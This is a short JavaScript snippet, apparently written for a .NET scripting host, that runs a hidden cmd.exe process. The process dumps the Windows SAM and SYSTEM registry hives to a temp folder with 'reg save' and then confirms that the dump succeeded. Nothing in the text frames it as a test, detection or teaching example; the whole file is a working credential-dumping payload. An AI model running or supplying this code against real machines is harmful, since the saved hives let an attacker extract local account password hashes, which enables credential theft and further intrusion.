(function() {
    var tempDir = null;
    var candidates = ["C:\\Windows\\Temp", "C:\\temp"];
    
    for (var i = 0; i < candidates.length; i++) {
        if (System.IO.Directory.Exists(candidates[i])) {
            tempDir = candidates[i];
            break;
        }
    }
    
    if (tempDir == null) {
        return "ERROR: No temp directory available (C:\\Windows\\Temp or C:\\temp)";
    }
    
    var cmd = "reg save HKLM\\SAM \"" + tempDir + "\\sam.save\" && reg save HKLM\\SYSTEM \"" + tempDir + "\\system.save\"";
    var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.CreateNoWindow = true;
    
    var p = System.Diagnostics.Process.Start(psi);
    var output = p.StandardOutput.ReadToEnd();
    var error = p.StandardError.ReadToEnd();
    p.WaitForExit();
    
    var result = "Exit code: " + p.ExitCode + "\nOutput: " + output + "\nError: " + error;
    
    // Vérifier si les fichiers ont été créés
    try {
        var samPath = tempDir + "\\sam.save";
        var systemPath = tempDir + "\\system.save";
        if (System.IO.File.Exists(samPath) && System.IO.File.Exists(systemPath)) {
            result += "\n\nSUCCESS: SAM and SYSTEM saved to " + tempDir;
        }
    } catch (e) {
        result += "\nFile check error: " + e.Message;
    }
    
    return result;
})()
